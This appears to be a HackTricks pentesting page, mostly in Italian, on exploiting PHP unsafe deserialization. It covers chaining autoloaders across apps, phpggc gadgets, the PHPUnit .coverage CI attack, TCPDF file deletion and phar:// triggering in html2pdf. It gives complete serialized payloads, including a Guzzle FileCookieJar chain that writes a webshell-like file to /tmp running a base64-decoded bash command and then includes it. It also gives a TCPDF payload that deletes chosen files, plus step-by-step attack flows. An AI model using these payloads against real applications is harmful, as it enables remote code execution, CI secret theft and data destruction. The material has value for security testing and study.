# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Per prima cosa, dovresti verificare cosa sono le [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Siamo in una situazione in cui abbiamo trovato una **PHP deserialization in a webapp** senza alcuna libreria vulnerabile a gadget presente in **`phpggc`**. Tuttavia, nello stesso container era presente una **different composer webapp with vulnerable libraries**. Di conseguenza, l'obiettivo era **caricare il composer loader dell'altra webapp** e abusarlo per **caricare un gadget che sfrutti quella libreria**, utilizzando un gadget disponibile nella webapp vulnerabile alla deserializzazione.

Steps:

- Hai trovato una **deserialization** e non c’è **alcun gadget** nel codice dell'app corrente
- Puoi abusare di una funzione **`spl_autoload_register`** come la seguente per **caricare qualsiasi file locale con estensione `.php`**
- Per questo usi una deserialization in cui il nome della classe sarà contenuto in **`$name`**. Non puoi usare "/" o "." in un nome di classe in un oggetto serializzato, ma il **code** sta **sostituendo** gli **underscores** ("_") con gli slash ("/"). Quindi un nome di classe come `tmp_passwd` verrà trasformato in `/tmp/passwd.php` e il codice cercherà di caricarlo.\
Un **gadget example** sarà: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Se hai una **file upload** e puoi caricare un file con **`.php` extension** potresti **abuse this functionality directly** e ottenere già RCE.

Nel mio caso non avevo nulla del genere, ma all'interno dello **stesso container** c'era un'altra web app composer con una **library vulnerable to a `phpggc` gadget**.

- Per caricare quest'altra library, prima devi **caricare il composer loader di quella altra web app** (perché quello dell'applicazione corrente non accederà alle librerie dell'altra). **Conoscendo il path dell'applicazione**, puoi ottenere questo molto facilmente con: **`O:28:"www_frontend_vendor_autoload":0:{}`** (nel mio caso, il composer loader era in `/www/frontend/vendor/autoload.php`)
- Ora, puoi **caricare** il composer loader dell'altra app, quindi è il momento di **`generate the phpgcc`** **payload** da usare. Nel mio caso ho usato **`Guzzle/FW1`**, che mi ha permesso di **scrivere qualsiasi file all'interno del filesystem**.
- NOTE: Il **gadget generato non funzionava**, per farlo funzionare ho **modificato** quel payload **`chain.php`** di phpggc e impostato **tutti gli attribute** delle classi **da private a public**. Altrimenti, dopo la deserializzazione della stringa, gli attributi degli oggetti creati non avevano alcun valore.
- Ora abbiamo il modo di **caricare il composer loader dell'altra app** e avere un **phpggc payload that works**, ma dobbiamo **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. Per questo, ho inviato un array serializzato con entrambi gli oggetti come:
- Puoi vedere **prima il loader che viene caricato e poi il payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Ora, possiamo **creare e scrivere un file**, tuttavia, l'utente **non poteva scrivere in nessuna cartella all'interno del web server**. Quindi, come puoi vedere nel payload, PHP che chiama **`system`** con del **base64** viene creato in **`/tmp/a.php`**. Poi, possiamo **riutilizzare il primo tipo di payload** che abbiamo usato come LFI per caricare il composer loader dell'altro webapp **per caricare il file generato `/tmp/a.php`**. Basta aggiungerlo al deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Sommario del payload**

- **Load the composer autoload** di un'altra webapp nello stesso container
- **Load a phpggc gadget** per abusare di una libreria dell'altra webapp (la webapp iniziale vulnerabile alla deserializzazione non aveva alcun gadget nelle sue librerie)
- Il gadget creerà **un file con un PHP payload** in /tmp/a.php contenente comandi maligni (l'utente della webapp non può scrivere in nessuna cartella di nessuna webapp)
- La parte finale del nostro payload caricherà il file php generato che eseguirà i comandi

Ho dovuto **chiamare questa deserializzazione due volte**. Nei miei test, la prima volta il file `/tmp/a.php` è stato creato ma non caricato, e la seconda è stato caricato correttamente.

### Novità phpggc (2025)

- Il **phpggc master branch** continua ad aggiungere chains: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 e altri sono arrivati nel 2025 — utili quando l'app target condivide vendor code con quei progetti. Un modo rapido per cercare è `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (aggiorna prima il tuo clone).
- Quando si mixano gadget tra app tramite autoloading, ricorda che **le proprietà private nelle definizioni dei gadget possono essere perse** quando le classi vengono ridefinite diversamente nel target; modifica il `chain.php` del gadget per rendere le proprietà `public` se il payload arriva con valori vuoti (stesso trucco mostrato sopra).

## PHPUnit PHPT coverage deserialization (punto di ingresso CI/CD)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) deserializzava oggetti PHP arbitrari dai file `.coverage` prodotti dal **PHPT runner**. Nelle pipeline CI dove contributori non attendibili possono pushare test, lasciare un file `.coverage` costruito ad arte innesca la deserializzazione non appena la suite viene eseguita — non è necessario accesso web.

**Flusso d'attacco**

1. Posiziona un file `.coverage` maligno nel repo (o artifact) contenente un gadget serializzato che esiste nelle dipendenze di test (es. una chain di Monolog o Guzzle da phpggc).
2. Invia una PR; quando la CI esegue `phpunit --configuration phpunit.xml`, il PHPT runner legge il file coverage e deserializza il gadget, ottenendo **RCE all'interno del container del runner**.
3. Questo è particolarmente pericoloso quando i test montano segreti CI (credenziali cloud, chiavi di deployment).

**Stub di coverage minimo e maligno** (posizionalo accanto a un test PHPT):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Esegui il PHPT in modo che phpunit consumi `exploit.coverage`.

## TCPDF `__destruct` POP chain per la cancellazione arbitraria di file

Quando una vera istanza di `TCPDF` viene raccolta dal garbage collector chiama `_destroy(true)`, itera su `$this->imagekeys`, e invoca `unlink()` su qualsiasi cosa che sembri un file di cache sotto `K_PATH_CACHE`. Se un'applicazione esegue `unserialize($user_data)` mentre la classe `TCPDF` è caricata (e.g. si aspetta un array con la chiave `html`), puoi fornire un oggetto serializzato che imposti:

- `file_id` su un intero che non è presente in `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` su percorsi che iniziano con `K_PATH_CACHE` o che possono essere fatti apparire tali (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` quando `K_PATH_CACHE` è `/tmp/`).

Esempio di payload che colpisce un flusso insicuro `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Il file viene cancellato non appena l'oggetto esce dallo scope. TCPDF 6.9.3 ha rafforzato il controllo per rimuovere solo i percorsi con il prefisso `__tcpdf_<file_id>_` all'interno di `K_PATH_CACHE` e ha introdotto `_unlink()` per bloccare schemi non `file://`, quindi le versioni più vecchie di `Producer` sono bersagli ideali.

### Attivazione del gadget tramite `phar://` nei tag `<cert>` di html2pdf

`spipu/html2pdf` (≤5.3.0) avvolge TCPDF e espone un blocco `<cert>` personalizzato i cui attributi `src`/`privkey` sono convalidati con il semplice `file_exists()`. Su PHP < 8.0 qualsiasi funzione di filesystem che tocca un URL `phar://` provoca la deserializzazione dei metadata Phar. Memorizzando l'oggetto TCPDF malevolo sopra dentro un archivio Phar si ottiene un POP affidabile anche se l'applicazione non chiama mai `unserialize()` direttamente.

1. Crea un Phar con `phar.readonly=0`, imposta lo stub/manifest in modo che assomigli a un'immagine (es. rinomina `archive.phar` in `archive.png`), e memorizza l'oggetto TCPDF serializzato nei metadata del Phar.
2. Carica/posiziona il file in un percorso raggiungibile come `/tmp/user_files/user_1/archive.png`.
3. Invia HTML contenente il tag CERT in modo che html2pdf risolva il percorso controllato dall'attaccante:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
La chiamata a file_exists() deserializes i metadati, istanzia TCPDF e il suo distruttore elimina il file scelto, trasformando html2pdf in un potente phar:// entry point. La versione 5.3.1 ha aggiunto Security::checkValidPath() per bloccare schemi non approvati, quindi le installazioni legacy restano attraenti.

## Riferimenti

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
